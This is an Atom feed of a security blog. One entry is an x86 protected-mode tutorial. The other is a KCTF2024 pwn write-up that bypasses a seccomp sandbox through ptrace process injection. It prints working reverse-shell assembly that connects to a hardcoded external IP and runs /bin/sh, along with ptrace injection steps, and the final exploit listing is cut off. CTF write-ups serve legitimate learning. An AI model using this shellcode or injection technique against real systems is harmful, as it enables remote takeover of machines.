<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233&#39;s blog</title>
  
  <subtitle>学习应该像呼吸一样自然</subtitle>
  <link href="https://xia0ji233.github.io/atom.xml" rel="self"/>
  
  <link href="https://xia0ji233.github.io/"/>
  <updated>2024-09-17T12:30:59.296Z</updated>
  <id>https://xia0ji233.github.io/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>x86的保护模式</title>
    <link href="https://xia0ji233.github.io/2024/09/17/x86_1/"/>
    <id>https://xia0ji233.github.io/2024/09/17/x86_1/</id>
    <published>2024-09-17T09:00:00.000Z</published>
    <updated>2024-09-17T12:30:59.296Z</updated>
    
    <content type="html"><![CDATA[<p>重新把内核基础学一遍，方便后续学习的展开。</p><span id="more"></span><p>x86 是一个非常经典的复杂指令集架构（CISC），它的特点是指令不定长，解析指令时会根据头个字节甚至是第二个字节决定指令解析的长度，作为本篇学习的研究例子。</p><p>x86 的 CPU 在早期都是以<strong>实模式</strong>运行的，在 80386 及以后，x86 CPU 新增了分页的虚拟内存机制，同时在 80286 CPU 中就新增了其它运行模式，比如<strong>保护模式</strong>，本篇将重点学习<strong>保护模式</strong>。</p><h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><h3 id="CPU分级"><a href="#CPU分级" class="headerlink" title="CPU分级"></a>CPU分级</h3><p>只需要知道，数值上越小，权限越大。就像你的Linux root的 uid 就是0。CPU设计的时候是分了四级 ring 环，如图所示：</p><img src="/2024/09/17/x86_1/1.png" class=""><img src="/2024/09/17/x86_1/1.png" class=""><p>最外层是 ring3，是我们平时程序运行的等级，只能执行少数的非特权指令。ring0 是操作系统或者是驱动运行的等级，分级的目的就是防止应用程序随意篡改内核数据。内核数据的不正确修改往往会导致操作系统无法继续运行，Linux上会直接 crash 并强制关机，Windows 会蓝屏。</p><p>在CPU设计的时候，将 ring2 和 ring1给了驱动程序去运行，然而实际情况是，大部分操作系统没有使用 ring1 和 ring2，只使用了 ring0 和 ring3。所以在编写驱动的时候，驱动程序通常是直接运行在和操作系统同一等级 ring0 的。</p><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>要理解保护模式，首先就得介绍一下段寄存器。</p><p>段寄存器主要有：CS，DS，SS，ES，FS，GS等等。最开始的实模式中，段寄存器的作用是做一个基址保存，因为当时 8086 的总线宽度为 20 位，寻址能力 1MB（2的20次方），但是寄存器却只有16位。于是 Intel 这么设计：16 位的段寄存器中的值 * 16 再加真实的 16 位寻址地址，得到了访问的真实地址，但是其中会有 12 位是重叠的。</p><ul><li>代码段寄存器CS与寄存器IP相配合获得当前线程代码执行到的内存位置；</li><li>数据段寄存器DS与各通用寄存器配合访问内存中的数据；</li><li>栈段寄存器SS与寄存器(E)SP、(E)BP配合访问线程的调用栈（call stack）；</li><li>扩展段寄存器ES用于特定字符串指令（如MOVS或CMPS）。</li></ul><p>随着技术的发展，段寄存器已经不是最初那个仅用来保存基址的寄存器了，但是它对用户来看，仍然是 16 位的寄存器。它的含义也有了很大的变化，分段，不仅要规定内存起始地址，目标长度，还有对应的操作权限，仅凭16位的段寄存器看起来是远远不够的（由于需要兼容早期版本的机器，段寄存器一直被设计为16位）。于是，属于我们用户层的段寄存器，就仅保存<strong>段选择子</strong>，其余信息保存在<strong>段描述符</strong>中。段描述符可以被存储在任何内存的位置，但是通常来说它在<strong>内核空间</strong>。</p><h3 id="GDT和LDT表"><a href="#GDT和LDT表" class="headerlink" title="GDT和LDT表"></a>GDT和LDT表</h3><p>上面提到了，段描述符是存储在内核空间的，内核空间负责维护了一张表，叫全局描述符表（GDT，Global Descriptor Table）。为了找到这张表，Intel 专门设计了一个寄存器 GDTR（Global Descriptor Table Register）来存储这张表的位置。</p><p>使用 LGDT 指令可以对 GDTR 寄存器做修改，当然，这也是特权指令，用户态无法直接调用。</p><p>除了 GDT，还允许程序员自行构建局部描述符表（LDT，Local Descriptor Table），它可以为每个进程构建一张段描述符表，另外，每一个LDT自身<strong>作为一个段</strong>存在，它们的段描述符被放在GDT中。LDT只是一个可选的数据结构，完全可以不用它，完全取决与操作系统的开发者意愿。实际上目前主流的 OS（Windows、Linux）中，很少出现 LDT 的身影，因为它们自身实现了很完整的分页管理机制，LDT 的实现可能的确对于内存管理有所方便，但还是和目前主流的 OS 设计观念不太相符（本人主观猜测）。</p><h3 id="段选择子-段描述符"><a href="#段选择子-段描述符" class="headerlink" title="段选择子&amp;段描述符"></a>段选择子&amp;段描述符</h3><p>前面提到了，段寄存器对于用户来说仅保存<strong>段选择子</strong>，通过<strong>段选择子</strong>所指示的信息可以找到对应的<strong>段描述符</strong>。先来看看段选择子的一个<strong>结构图</strong>：</p><img src="/2024/09/17/x86_1/2.png" class=""><p>最低的两位指示了CPU的请求特权等级（RPL，Request Privilege Level），猜测这里刚好对应 CPU 的四个环。</p><p>最低的第三位指示了该段的<strong>段描述符</strong>是查找 LDT 还是查找 GDT，如果为 0 表示查找 GDT。</p><p>其余指示了<strong>段描述符</strong>在 GDT 或者 LDT 的索引。</p><hr><p>段描述符的结构如图所示（以32位为例）：</p><img src="/2024/09/17/x86_1/3.png" class=""><p>它的成员有很多，一个一个来介绍：</p><ul><li><p>P位：段描述符是否有效</p></li><li><p>Base：被分成了三个部分，Base 的低16位被放置在低 4 个字节的前两个字节。高 16 位分别被分到了高四个字节的首尾字节。</p></li><li><p>Limit：段限长，可以发现只有 <code>16+4=20</code> 位，范围在 <code>1B~1MB</code>，但是它还有个 G 位，可以保证32位程序的段限长到 4GB。</p></li><li><p>G位：是否以页为单位。如果 <code>G=1</code>，那么段限长以页（4KB）为单位，否则以字节（B）为单位。这样就保证了，段限长最大可以达到 $2^{20}\times4\text{KB}&#x3D;4\text{GB}$。</p></li><li><p>S位：描述符是否为<strong>代码或数据</strong>段描述符。如果 <code>S=1</code>，则为代码或数据段描述符，否则为<strong>系统</strong>段描述符。</p></li><li><p>TYPE域：有四位的大小，比较复杂，根据 S 位具有不同的含义，在下面展开讲。</p></li></ul><p>当 <code>S=1</code> 时，为<strong>代码或者数据段描述符</strong>，具体如下图所示：</p><img src="/2024/09/17/x86_1/4.png" class=""><p>最高位显然是区分是否为代码段的，若为 1 则是<strong>代码段</strong>，其余还有五个位需要介绍。</p><ol><li>A：访问位，判断该段是否被访问过</li><li>E：向下扩展位，向下扩展表示段基址开始到段限长范围内的内存都可以访问，向上扩展则刚好相反，段基址到段限长之间的内存不能访问，其余可以访问。</li><li>R：可读位，表示是否可读。</li><li>W：可写位，表示是否可写（默认可读）。</li><li>C：一致位，后面将介绍一致位。</li></ol><p>如下图展示了向下扩展位和向上扩展位的区别，绿色块表示可访问，红色块表示不可访问。</p><img src="/2024/09/17/x86_1/5.png" class=""><p>当 <code>S=0</code> 时，为<strong>系统段描述符</strong>，TYPE域的具体如下所示：</p><img src="/2024/09/17/x86_1/6.png" class=""><p>下面接着讲段描述符相关的成员。。</p><ul><li>D&#x2F;B位：可以简单的理解为是 16 位和 32 位的一个区分。</li><li>DPL位：规定了访问这个段所需的权限。通常来说，当你的权限 &lt;&#x3D; 段权限时，访问才是允许的（这里数值越小，权限越高）。</li><li>AVL位：AVL指示是否可供系统软件使用，由操作系统来使用。</li></ul><p>也来看看 D 位的区别：</p><img src="/2024/09/17/x86_1/7.png" class=""><p>红色表示向下拓展能寻址的范围。可以看出，如果<code>D = 0</code>，就算原来能寻址<code>4GB</code>，因为DB位的限制导致最大范围是<code>64KB</code>。</p><h3 id="段权限"><a href="#段权限" class="headerlink" title="段权限"></a>段权限</h3><p>其实前面介绍的已经比较完整了，段权限被存储在两个位置，一个是<strong>段选择子</strong>，一个是<strong>段描述符</strong>，但是这里要介绍三种权限等级。</p><ol><li>当前特权级（CPL，Current Privilege Level），存储在代码段寄存器（段选择子）的低2位，表示了当前进程的特权等级。</li><li>请求特权级（RPL，Request Privilege Level），存储在其它段寄存器的低2位。表明了访问这个段所使用的权限。</li><li>段描述符特权级（DPL，Descriptor Privilege Level），存储在段描述符中，表明了访问这个段所需的特权等级。</li></ol><p>这里可能会对 RPL 和 DPL 有所分不清，想着这俩不都是对同一个段的描述么，为什么还要进行区分。这里需要说明，两个的区别，DPL表示了，你访问这个段最少需要多少的权限。RPL 则指示了，我访问这个段通过什么权限去访问。</p><p>比如一个 ring0 的程序，它的特权等级显然是 0，但是它要去访问一个低权限的段可以不用这么高的权限，我可以只使用 ring3 的权限，所以我只需要修改一下我请求的这个段的 RPL 就可以更改我访问的权限而不必修改自身的权限（CPL）。</p><p>这里再举一个通俗易懂的例子：</p><p>正国级（0），正部级（1），正厅级（2），正处级（3）。它们所能管辖的范围也有所不同，对应的分别是全国（0），省级（1），市级（2），县级（3）。CPL就相当于你个人的职级，行政单位的权限就相当于段特权等级（DPL）。RPL在里面就有点意思了，它不随前两个变化，随你心意。你身为省长，想去一个县里面的单位视察肯定没有问题，但是问题来了，你要以什么身份去视察呢？这个身份，就是你去视察的地方所使用的特权等级（RPL）。显而易见的，你所使用的请求特权等级，必须低于或者等于你自身的身份。因为大官冒充小官，说好听点叫微服私访，而小官冒充大官就涉嫌招摇撞骗了。</p><p>同样的，判断你能不能访问一个段，需要做两方面的检查，第一，判断你级别够不够，第二，判断你有没有招摇撞骗。即，在访问一个段时，作两个检查</p><ol><li>RPL&lt;&#x3D;DPL（判断级别够不够）</li><li>CPL&lt;&#x3D;RPL（判断是否招摇撞骗）</li></ol><p>如果都通过了，说明你是可以访问这个段的，否则就会引发段错误。</p><h3 id="一致性与非一致性"><a href="#一致性与非一致性" class="headerlink" title="一致性与非一致性"></a>一致性与非一致性</h3><ul><li>对于一致代码段:也就是共享的段.<ol><li>特权级高的程序不允许访问特权级低的数据:核心态不允许调用用户态的数据.</li><li>特权级低的程序可以访问到特权级高的数据.但是特权级不会改变:用户态还是用户态.</li></ol></li><li>对于普通代码段.也就是非一致代码段:<ol><li>只允许同级间访问.</li><li>绝对禁止不同级访问:核心态不用用户态.用户态也不使用核心态.</li></ol></li><li>对于数据段来说高特权允许访问低特权的数据而不允许低特权访问高特权的数据。</li></ul><p>总结：</p><p>非一致代码段只允许同级访问。</p><p>对于一致性的段，一般情况下认为内核代码是完善的，不容易出错的，用户层的代码是不完善的，极容易出错的。因此允许用户调用内核提供的代码，而不允许内核调用用户的代码。</p><p>对于一致性的数据段，一般情况下认为内核的数据很私密，不能够随便让应用程序读取。而操作系统对用户的数据应当有知情权，不论是为了调试还是管理，都应当有知情权。</p><p>可以总结出以下表</p><table><thead><tr><th></th><th>向高特权请求</th><th>向低特权请求</th><th>同级请求</th><th>适用性</th></tr></thead><tbody><tr><td>一致代码段</td><td>Y</td><td>N</td><td>Y</td><td>共享库函数，暴漏的内核接口</td></tr><tr><td>非一致代码段</td><td>N</td><td>N</td><td>Y</td><td>避免低特权级的程序执行的代码</td></tr><tr><td>数据段</td><td>N</td><td>Y</td><td>Y</td><td>*</td></tr></tbody></table><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>（注：引用不分先后）</p><ul><li>[1]：<a href="https://www.cnblogs.com/johnnyflute/p/3564894.html">https://www.cnblogs.com/johnnyflute/p/3564894.html</a></li><li>[2]：<a href="https://zh.wikipedia.org/wiki/X86%E8%A8%98%E6%86%B6%E9%AB%94%E5%8D%80%E6%AE%B5">https://zh.wikipedia.org/wiki/X86%E8%A8%98%E6%86%B6%E9%AB%94%E5%8D%80%E6%AE%B5</a></li><li>[3]：<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1">http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1</a></li><li>[4]：<a href="https://www.cnblogs.com/wingsummer/p/15312627.html">https://www.cnblogs.com/wingsummer/p/15312627.html</a></li></ul>]]></content>
    
    
    <summary type="html">重新把内核基础学一遍，方便后续学习的展开。</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="X86" scheme="https://xia0ji233.github.io/categories/X86/"/>
    
    <category term="Protected_Mode" scheme="https://xia0ji233.github.io/categories/X86/Protected-Mode/"/>
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/categories/Windows/Kernel/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>KCTF2024第八题 writeup</title>
    <link href="https://xia0ji233.github.io/2024/09/02/KCTF2024/"/>
    <id>https://xia0ji233.github.io/2024/09/02/KCTF2024/</id>
    <published>2024-09-02T12:00:00.000Z</published>
    <updated>2024-09-02T14:16:04.405Z</updated>
    
    <content type="html"><![CDATA[<p>KCTF2024第八题——星门 writeup</p><span id="more"></span><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>拿到题目，是一道典型的写shellcode的题目，白名单系统调用，只允许 read，wait4 和 ptrace。</p><img src="/2024/09/02/KCTF2024/1.png" class=""><p>沙箱系统调用号白名单首先想到了切架构，但是它题目也有判断架构。因此就只能利用这个 ptrace 去做文章了。</p><p>其次应当考虑信息以何种方式回传，因为原进程是连write都不能用的，侧信道也没法，所以便起了一个docker环境去试试。发现启动脚本中。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line">/etc/init.d/xinetd start;</span><br><span class="line"><span class="built_in">sleep</span> infinity;</span><br></pre></td></tr></table></figure><p>​于是选择让队友先起一个docker环境，然后观察里面可以使用的进程。</p><img src="/2024/09/02/KCTF2024/2.png" class=""><p>发现了进程 <code>sleep infinity</code>，并且占用的 pid 始终保持 20 以内，并且脚本启动就是 root 权限，不用担心附加不上的问题。</p><p>最后要去尝试的一点就是该靶机是否出网，静态编译一个 socket 请求对外连接发现完全可行，因此考虑反弹 shell。</p><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>于是开始着手写 shellcode，先写可以反弹shell的shellcode，这个shellcode是我们要注入到目标进程的。这里为了保证shellcode正确，先编译一个 demo 尝试。</p><p>反弹 shell 用汇编去描述其实也非常简单。首先，反弹shell的步骤如下：</p><ol><li>起一个socket套接字</li><li>连接远程服务器</li><li>将标准输入，标准输出，标准错误描述符都重定向到这个套接字描述符。</li><li>execve 运行一个 shell 程序。</li></ol><p>这四个步骤分别可以对应</p><ol><li>socket</li><li>connect</li><li>dup2</li><li>execve</li></ol><p>这四个系统调用，稍微了解一下，把参数一传，就可以达到反弹 shell 的目的。</p><p>最终我的 shellcode 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">mov edi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rdx,0x30</span><br><span class="line">mov eax,1</span><br><span class="line">syscall</span><br><span class="line">/*socket(AF_INET,SOCK_STREAM,0)*/</span><br><span class="line">mov edi,2</span><br><span class="line">mov esi,1</span><br><span class="line">mov edx,0</span><br><span class="line">mov eax,41</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov r14,0xe14e2b650f270002</span><br><span class="line">mov r15,0x64</span><br><span class="line">mov r12,rsp</span><br><span class="line">mov [r12],r14</span><br><span class="line">mov [r12+8],r15</span><br><span class="line">mov r13,r12</span><br><span class="line">/*connect(sockfd,serveraddr,16)*/</span><br><span class="line">mov edi,eax</span><br><span class="line">mov rsi,r13</span><br><span class="line">mov edx,16</span><br><span class="line">mov eax,42</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* dup2(fd=3, fd2=0) */</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">xor esi, esi /* 0 */</span><br><span class="line">/* call dup2() */</span><br><span class="line">push SYS_dup2 /* 0x21 */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* dup2(fd=3, fd2=1) */</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push 1</span><br><span class="line">pop rsi</span><br><span class="line">/* call dup2() */</span><br><span class="line">push SYS_dup2 /* 0x21 */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* dup2(fd=3, fd2=2) */</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push 2</span><br><span class="line">pop rsi</span><br><span class="line">/* call dup2() */</span><br><span class="line">push SYS_dup2 /* 0x21 */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">/* execve(path=&#x27;/bin/sh&#x27;, argv=0, envp=0) */</span><br><span class="line">/* push b&#x27;/bin/sh\x00&#x27; */</span><br><span class="line">mov rax, 0x101010101010101</span><br><span class="line">push rax</span><br><span class="line">mov rax, 0x101010101010101 ^ 0x68732f6e69622f</span><br><span class="line">xor [rsp], rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx /* 0 */</span><br><span class="line">xor esi, esi /* 0 */</span><br><span class="line">/* call execve() */</span><br><span class="line">push SYS_execve /* 0x3b */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>其中 dup2 和 execve 都可以用 shellcraft 生成，socket 和 connect 需要自己配参数，因为你搜网上的教程大概率都是用一堆的宏。shellcraft 似乎不支持这个，所以需要手动去看看那些宏的值是多少。</p><p>至于 <code>0xe14e2b650f270002</code> 这个数怎么来的，可以直接 C 编译出去再看看的，C语言的写法是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddr</span>;</span></span><br><span class="line"><span class="type">int</span> clientSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//TCP listen</span></span><br><span class="line">serverAddr.sin_family = AF_INET;</span><br><span class="line">serverAddr.sin_port = htons(<span class="number">9999</span>);</span><br><span class="line">serverAddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;101.43.78.225&quot;</span>);</span><br><span class="line">connect(clientSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverAddr, <span class="keyword">sizeof</span>(serverAddr))</span><br></pre></td></tr></table></figure><p>编译，gdb调试</p><img src="/2024/09/02/KCTF2024/3.png" class=""><p>得到对应 <code>ip port</code> 的 <code>serverAddr</code> 的值。</p><p>这里需要注意的是，<code>connect</code> 中间需要构造一个 16 字节大小的结构体，然后传指针进去。这里一开始会比较头疼，因为你可能苦于没有确定可写的地址，但是后面想到 rsp 和 rbp 所指向的值通常是可写的，就往里面去写，然后把 rbp 作为这里的第二个参数。</p><p>然后就能得到手搓的 connect 代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mov r14,0xe14e2b650f270002</span><br><span class="line">mov r15,0x64</span><br><span class="line">mov r12,rsp</span><br><span class="line">mov [r12],r14</span><br><span class="line">mov [r12+8],r15</span><br><span class="line">mov r13,r12</span><br><span class="line">/*connect(sockfd,serveraddr,16)*/</span><br><span class="line">mov edi,eax</span><br><span class="line">mov rsi,r13</span><br><span class="line">mov edx,16</span><br><span class="line">mov eax,42</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>将代码注入一个 demo 进程，反弹 shell 成功</p><img src="/2024/09/02/KCTF2024/4.png" class=""><h3 id="注入进程"><a href="#注入进程" class="headerlink" title="注入进程"></a>注入进程</h3><p>随后我们需要写一个可以利用 ptrace 将代码注入到另一个进程的 shellcode。</p><p>这里把上面编译好的 shellcode 放到  + 0x200 的位置上，方便做循环，然后开始编写注入代码，这里本地调试就假设我们已知我们要注入的进程的 pid。</p><p>这里可以写一个被注入进程的 demo。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pid=%d\n&quot;</span>,getpid());</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关 ptrace 的解析，可以看我这一篇<a href="https://xia0ji233.pro/2023/12/03/Ptrace/">文章</a>。首先我们要用 <code>PTRACE_ATTACH</code> 去附加这个进程，这里有一点很坑的地方是，它的第四个参数貌似不是 rcx 是 r10，并且用 shellcraft 生成也是这样，所以我在原有的基础上会加一句 <code>mov r10,rcx</code>。</p><p>所以第一步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*save mmap start addr*/</span><br><span class="line">push rdx</span><br><span class="line">/* ptrace(request=0x10, vararg_0=0x64, vararg_1=0, vararg_2=0) */</span><br><span class="line">mov edi,0x10/*ATTACH*/</span><br><span class="line">mov esi,&#123;pid&#125;</span><br><span class="line">mov rdx,0</span><br><span class="line">mov rcx,0</span><br><span class="line">mov eax,SYS_ptrace /* 0x65 */</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>第一句是因为调用入口时 <code>call rdx</code> 因此这里先保存 mmap 分配的地址，方便给下面的寄存器使用。</p><p>第二步，因为在 ptrace 附加完成之后，进程会被阻塞，所以我们可以趁这个时机将 RIP 后面的代码布置成我们上面编写的 shellcode。所以这一步需要获取 RIP 的值。</p><p>ptrace 有获取寄存器的选项，<code>ptrace(PTRACE_GETREGS, pid, NULL, &amp;regs);</code></p><p>第四个参数是指针，我们随便给一个内存区域即可，这里我用了 +0x800 的位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov edi,0xc /*GETREGS*/</span><br><span class="line">mov esi,&#123;pid&#125;</span><br><span class="line">mov rdx,0</span><br><span class="line">pop rcx</span><br><span class="line">push rcx</span><br><span class="line">add rcx,0x800</span><br><span class="line">mov r10,rcx</span><br><span class="line">mov eax,SYS_ptrace /* 0x65 */</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>接下来是获取当前目标进程 RIP 的值，这里可以直接看结构体定义算偏移，也可以直接 gdb 起一个看看偏移，实际它在结构体的偏移是 +0x80。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rcx</span><br><span class="line">push rcx</span><br><span class="line">add rcx,0x880</span><br><span class="line">mov rdx,[rcx]</span><br><span class="line">/*RIP offset*/</span><br></pre></td></tr></table></figure><p>接下来就用汇编写一个循环，ptrace 一次读写内存都是 8 个字节，并且需要注意的是，在写数据的时候，第四个参数不作为指针，而是直接作为一个字的数据被写入。</p><p>最后一点需要注意的是，shellcode 写入完成之后，要主动让进程脱离调试器，如果不管的话附加的进程死亡会导致被附加的进程一起死亡，shellcode不一定能被执行。</p><p>本地调试的时候可能会有一点麻烦，如果进程异常退出基本很难查到问题所在，因为一个进程不能同时被两个进程调试，因此我们需要调试附加的进程，每一次 ptrace 调用时查看返回值是否 &lt;0，我遇到的比较多的是返回 -5，当时是一个内存写入错误，仔细一查发现是汇编代码写错了一个，导致取到了错误的地址。</p><h2 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span 